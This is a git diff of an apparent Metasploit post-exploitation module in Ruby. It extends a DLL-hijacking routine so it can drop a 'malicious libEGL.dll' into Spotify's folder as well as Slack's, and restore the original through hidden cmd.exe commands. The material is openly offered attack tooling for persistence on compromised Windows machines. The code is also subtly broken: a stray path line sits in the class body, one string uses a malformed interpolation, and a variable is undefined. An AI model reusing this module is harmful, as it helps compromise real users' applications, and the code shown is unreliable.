@@ -125,14 +125,15 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false])
+                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false]),
+                                OptBool.new('SPOTIFY', [ false, 'Deploy malicious dll into spotify service?' , false])
                         ], self.class)
  
         end
 
 
 
-
+C:\\Users\tester\\AppData\\Roaming\\Spotify
 
 
 # --------------------------------------------
@@ -142,10 +143,8 @@ def ls_stage1
 
   r=''
   session = client
-  p_name = "libEGL.dll" # malicious libEGL.dll
-  s_name = "slack.exe" # service executable
+  p_name = "libEGL.dll"              # malicious libEGL.dll
   u_path = datastore['LOCAL_PATH']   # /root/libEGL.dll
-  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'].blank?
@@ -157,6 +156,14 @@ def ls_stage1
     sleep(1.5)
   end
 
+  # chose were to deploy payload (slack OR spotify)...
+  if datastore['SPOTIFY'] == true
+     d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
+     s_name = "Spotify.exe" # service executable
+  else
+    d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
+    s_name = "slack.exe" # service executable
+  end
 
     # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
@@ -218,7 +225,6 @@ def ls_stage2
   session = client
   p_name = "libEGL.dll" # malicious libEGL.dll
   b_name = "libEGL.bk" # service executable
-  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['REVERT_HIJACK'].blank?
@@ -228,6 +234,16 @@ def ls_stage2
   else
     print_status("Deleting malicious dll!")
     sleep(1.5)
+  end
+
+
+  # chose were to deploy payload (slack OR spotify)...
+  if datastore['SPOTIFY'] == true
+     d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
+     s_name = "Spotify.exe" # service executable
+  else
+    d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
+    s_name = "slack.exe" # service executable
   end
 
     # check if backup exist in target
@@ -240,15 +256,20 @@ def ls_stage2
 
       # revert original dll...
       print_good(" Revert slack dll to default stage...")
-      r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_name}\\#{b_name} #{d_path}\\${p_name}", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_name}\\#{b_name} #{d_path}\\${p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
       print_status("slack dll reverted to default stage...")
       print_line("")
 
-
     # close channel when done
     r.channel.close
     r.close
+
+    else
+      print_error("ABORT: post-module cant find backup dll...")
+      print_error("backup dll: #{d_path}\\#{b_name}")
+      print_line("")
+    end
 
   # error exception funtion
   rescue ::Exception => e
